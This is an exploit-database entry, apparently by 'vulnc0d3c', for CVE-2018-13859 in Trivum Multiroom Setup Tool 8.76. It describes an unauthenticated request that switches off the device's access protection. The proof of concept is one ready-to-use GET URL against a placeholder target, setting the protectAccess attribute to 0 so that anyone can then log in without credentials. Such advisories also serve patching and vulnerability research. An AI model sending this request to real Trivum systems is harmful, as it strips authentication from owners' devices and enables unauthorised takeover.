# Exploit Title: Trivum Multiroom Setup Tool 8.76 - Corss-Site Request Forgery (Admin Bypass)
# Date: 2018-07-25
# Software Link: [https://world.trivum-shop.de](https://world.trivum-shop.de/)
# https://world.trivum-shop.de/# Version: < 9.34 build 13381 - 12.07.18
# Category: hardware, webapps
# Tested on: V8.76 - SNR 8604.26 - C4 Professional
# Exploit Author: vulnc0d3c
# CVE: CVE-2018-13859

# 1. Description
# MusicCenter / Trivum Multiroom Setup Tool V8.76 - SNR 8604.26 - C4 Professional before V9.34 build 13381 - 12.07.18,
# allow unauthorized remote attackers to reset the authentication via "/xml/system/setAttribute.xml" URL, using GET request
# to the end-point "?id=0&attr=protectAccess&newValue=0"
# (successful attack will allow attackers to login without authorization).

# 2. Proof of Concept
# GET Request

http://target/xml/system/setAttribute.xml?id=0&attr=protectAccess&newValue=0